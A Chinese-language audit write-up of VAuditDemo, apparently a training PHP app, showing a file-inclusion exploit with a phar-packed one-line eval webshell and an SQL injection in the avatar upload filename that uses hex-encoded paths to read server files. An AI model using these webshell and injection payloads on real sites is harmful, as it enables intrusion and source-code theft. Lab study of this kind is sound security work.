[TOC]



# ==VAuditDemo文件漏洞==

## 一、首页文件包含漏洞

index.php 中 虽然包含了 lib.php 这个安全能力比较nb的文件，但是，其中并没有对文件有什么重要的措施，仅仅只是对文件后缀名的白名单而已，而且 index.php 文件并没有使用 is_pic 这个函数。

但是 index.php 文件却对所包含的文件添加了一个后缀叫 .inc 这样使得很多文件包含再次都会失效，因为浏览器时无法解析 .inc 文件的。

### 包含图片马

可是，作为攻击者，并不一定需要浏览器解析，而是只要有所包含的文件的内容即可，所以，此漏洞，结合头像上传图片马，再利用该漏洞包含图片马，即使后缀被添加 .inc 只要包含到图片马中的内容即可利用

**唯一需要注意的是，图片名称需要爆破得到，作为攻击者，在请求响应中是看不到上传的头像的名称的**

```
//index.php 文件重要内容如下
<?php 
require_once('sys/config.php');
require_once('header.php');
?>

<?php
/* Include */
    if (isset($_GET['module'])){
    	include($_GET['module'].'.inc');
    }else{
?>

//lib.php 部分内容如下
function is_pic( $file_name ) {
	$extend =explode( "." , $file_name );
	$va=count( $extend )-1;
	if ( $extend[$va]=='jpg' || $extend[$va]=='jpeg' || $extend[$va]=='png' ) {
		return 1;
	}
	else
		return 0;
}
```

![image-20240819184438843](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819184438843.png)

而且，既然有了这个想法，我们是不是还可以在图片马中添加 hook.js ，一旦这个可以添加进去被包含，那就真赚大了

### 利用伪协议phar:// 构造shell.inc被压缩为shell.zip，然后更改shell.zip 为 shell.jpg上传

- 构造 shell.inc 内容为 `<?php @eval($_POST['a']);?>` 
- shell.inc 添加到 shell.zip ，然后修改后缀zip为jpg
- 上传，测试环境直接找到文件名
- 访问，由于 .inc 程序里已经设定好了，所以访问时就不需要再添加 .inc 了

![image-20240819191415497](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819191415497.png)

此时就可以使用菜刀链接，菜刀链接上了之后就可以再上传冰蝎马，再用冰蝎链接，更为保妥。

> 令人深思的是，如果单纯作为攻击者，纯黑盒，又该怎样获取上传的文件名呢，事实上是这样的
>
> 在攻击者上传后门时，通过抓包可以看到
>
> ![image-20240819191926806](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819191926806.png)
>
> 此时，既把后门上传了，又能看到上传的时间，此时爆破时间戳，由于此时的时间设定是 GMT：格林威治标准时间 
>
> ![image-20240819192216090](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819192216090.png)
>
> 我们可以看到，左边是 GMT 时间，右边是中国时间，相差整整八小时，所以通过抓包得到的响应中的时间，再加八小时得到的时间，大约就是图片上传到服务器的时间，再利用 `date +%s` 就可以得到服务器的 unix元年时间戳
>
> ![image-20240819192540677](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819192540677.png)
>
> 然后上下十秒左右的时间范围内，构造出时间戳字典，用来爆破
>
> > 如果，服务器时间不准确，与中国时间不符，可使用 `ntpdate ntp.aliyun.com` 命令来同步服务器时间与阿里云的时间服务器的时间



## 二、任意文件读取漏洞

我们之前已经讨论过头像文件上传这个问题了，但由于没有具体分析，所以没有意识到问题的严重性，这里一共涉及到三个文件 avatar.php updateAvatar.php logCheck.php

### avatar.php

```php
<?php
error_reporting(0);
session_start();
header("Content-type:image/jpeg");
echo file_get_contents($_SESSION['avatar']);
?> 
```

我们可以看到，该文件将会输出`$_SESSION['avatar']`变量中所存储的文件内容，通过全局搜索，发现接下来两个文件有重大嫌疑

### updateAvatar.php

```php
<?php
include_once('../sys/config.php');
$uploaddir = '../uploads';

if (isset($_POST['submit']) && isset($_FILES['upfile'])) {

	if(is_pic($_FILES['upfile']['name'])){

		$avatar = $uploaddir . '/u_'. time(). '_' . $_FILES['upfile']['name'];
		// die($avatar);

		if (move_uploaded_file($_FILES['upfile']['tmp_name'], $avatar)) {
			//更新用户信息
			$query = "UPDATE users SET user_avatar = '$avatar' WHERE user_id = '{$_SESSION['user_id']}'";
			mysql_query($query, $conn) or die('update error!');
			mysql_close($conn);
			//刷新缓存
			$_SESSION['avatar'] = $avatar;
			header('Location: edit.php');
		}
		else {
			echo 'upload error<br />';
			echo '<a href="edit.php">返回</a>';
		}
	}else{
		echo '只能上傳 jpg png gif！<br />';
		echo '<a href="edit.php">返回</a>';
	}
}
else {
	not_find($_SERVER['PHP_SELF']);
}
?>

```

通过分析发现 `$avatar` 变量经过拼接之后，就可以对数据库进行操作，更新到数据库中，然后更改当前用户的 `$_SESSION['avatar']` 为 `$avatar` ，说明，可以通过 `$avatar` 变量来操作数据库

### logCheck.php

```php
<?php
include_once('../sys/config.php');

if (isset($_POST['submit']) && !empty($_POST['user']) && !empty($_POST['pass'])) {
	$clean_name = clean_input($_POST['user']);
	$clean_pass = clean_input($_POST['pass']);
    $query = "SELECT * FROM users WHERE user_name = '$clean_name' AND user_pass = SHA('$clean_pass')";
    $data = mysql_query($query, $conn) or die('Error!!');

    if (mysql_num_rows($data) == 1) {
        $row = mysql_fetch_array($data);
		$_SESSION['username'] = $row['user_name'];
		$_SESSION['avatar'] = $row['user_avatar'];
		$ip = sqlwaf(get_client_ip());
		$query = "UPDATE users SET login_ip = '$ip' WHERE user_id = '$row[user_id]'";
		mysql_query($query, $conn) or die("updata error!");
        header('Location: user.php');
        }
	else {
		$_SESSION['error_info'] = '用户名或密码错误';
		header('Location: login.php');
	}
	mysql_close($conn);
}
else {
	not_find($_SERVER['PHP_SELF']);
}
?>
```

通过分析发现，一旦用户登录成功就会修改该用户的 `$_SESSION['avatar']` 变量的值为 `$row['user_avatar']` ，而这个值的内容是正式从数据库中查询出来的。所以，最重要的 步骤就是 updateAvatar.php 文件的功能，他是可以直接操作数据库的。

**综上所述，一旦通过  `$avatar` 变量成功操作数据库之后将文件名赋值给 `$_SESSION['avatar']` ，此时仅仅只是这个值被修改，对应用户的SESSION变量需要重新登陆才会刷新，所以攻击者再重新登陆一次 `$_SESSION['avatar']` 变量的值就会被修改为上传的恶意文件的文件名。此时再通过 `avatar.php` 文件数据对应的文件内容就可以实现漏洞利用**

```sql
$avatar = $uploaddir . '/u_'. time(). '_' . $_FILES['upfile']['name'];

$query = "UPDATE users SET user_avatar = '$avatar' WHERE user_id = '{$_SESSION['user_id']}'";

UPDATE users SET user_avatar = '$avatar' WHERE user_id = '{$_SESSION['user_id']}'

UPDATE users SET user_avatar = 'index.jpg' WHERE user_id = '10'
    
UPDATE users SET user_avatar = 'index.php' where user_name='wwww'#.jpg' WHERE user_id = '10'

#加上程序所添加的前缀../uploads/u_12345678_
    
UPDATE users SET user_avatar = '../uploads/u_12345678_index.php' where user_name='wwww'#.jpg' WHERE user_id = '10'

UPDATE users SET user_avatar = '../uploads/u_12345678_index.php',user_avatar='index.php' where user_name='wwww'#.jpg' WHERE user_id = '10'
#或者
UPDATE users SET user_avatar = '../uploads/u_12345678_',user_avatar = 'index.php' where user_name='wwww'#.jpg' WHERE user_id = '10'

#最终删掉程序添加的前缀
    
UPDATE users SET user_avatar = 'index.php',user_avatar='index.php' where user_name='wwww'#.jpg' WHERE user_id = '10'
#或
UPDATE users SET user_avatar = '',user_avatar = 'index.php' where user_name='wwww'#.jpg' WHERE user_id = '10'

#得到最终的payload
index.php',user_avatar='index.php' where user_name='wwww'#.jpg
#或
',user_avatar = 'index.php' where user_name='wwww'#.jpg

#并且这样构造还可以让任意用户的头像都变成我们所上传的文件，只需要将payload中的where user_name='wwww'修改为 where user_id='3' 修改数字即可
```

![image-20240819225513479](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819225513479.png)

最终，二者payload全部获胜

然后，比如攻击者想读取默认首页的后台页面 index.php ，所以攻击者需要确定好目录，我们作为测试人员可以知道 对于 updateAvatar.php 文件来说 index.php 在他的上一级目录下，所以还需要加上 ../ 才可以，于是最终的payload为

```sql
index.php',user_avatar='../index.php' where user_name='wwww'#.jpg
#或
',user_avatar = '../index.php' where user_name='wwww'#.jpg
```

现在我们拿着payload去注入测试

### 任意文件读取漏洞利用

- 访问上传文件页面，上传文件并抓包，修改文件名为payload

  ![image-20240819231321449](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819231321449.png)

- 发现请求只能发一段，响应也只有一段，拿到navicat中去测试发现两个payload都是正确执行的，这是为什么？不信了我还，使用不带 ../ 的payload再用burp注入试试

  使用 `shell.php',user_avatar='index.php' where user_name='wwww'#.jpg` ，此时就有三段请求需要发送，说明此时才算注入成功，但为什么带上 ../ 就无法注入了呢

  从上面我们可以得知 ../ 无法在payload 中使用，估计是被编码或者是被怎么处理了，遇到这种情况，我们千万不要忘了SQL语句中是可以执行十六进制代码的，并且十六进制代码完全可以充当字符串（也就是使用十六进制代码时就可以不需要引号包裹了），所以我们**将 所要查看的目录 转换为十六进制然后加上 0x 构成新的payload，再在burp中发送**。

  ![image-20240819232846937](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819232846937.png)

- 最终的payload

  ```sql
  index.php',user_avatar=0x2E2E2F696E6465782E706870 where user_name='wwww'#.jpg
  #或
  ',user_avatar = 0x2E2E2F696E6465782E706870 where user_name='wwww'#.jpg
  ```

- burp抓包发送

  ![image-20240819233045964](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819233045964.png)

  此时一共可以发送三段请求，说明请求成功，并且数据库中也发现文件名修改成功

  ![image-20240819233204610](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819233204610.png)

  

- 访问 avatar.php 抓包，看响应

  ![image-20240819233417738](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819233417738.png)

  响应竟然是这么个玩意，这不是我上传的文件中的内容嘛，原因是什么，是因为攻击者还没有重新登陆，SESSION变量确实被修改了，但是我这个用户还没有重新登陆，使用的SESSION还是旧的SESSION，需要重新登陆才可以使用新的SESSION，所以，重新登录，再访问（虽说最后的SESSION还是一样的，但是我们可以理解为，后台服务器修改了代码，前端没有强制刷新缓存导致加载新资源失败，这里的退出登录就是类似于刷新缓存）

- 终于，访问默认首页后端代码成功

  ![image-20240819233909385](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819233909385.png)

- 基于此再尝试一下另一个payload `',user_avatar = '../index.php' where user_name='wwww'#.jpg` 为了验证，我打算修改目录为 ../admin/index.php 

  ![image-20240819234445748](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819234445748.png)

  所以payload为 `',user_avatar = 0x2E2E2F61646D696E2F696E6465782E706870 where user_name='wwww'#.jpg`

  ![image-20240819234638723](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819234638723.png)

  哦耶，成功发送三段请求，数据库也成功被修改了

  ![image-20240819234752450](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819234752450.png)

  退出，重新登陆，去抓包访问 avatar.php，成功读取到admin/index.php，一模一样

  ![image-20240819234928809](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819234928809.png)

  ![image-20240819234957322](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240819234957322.png)
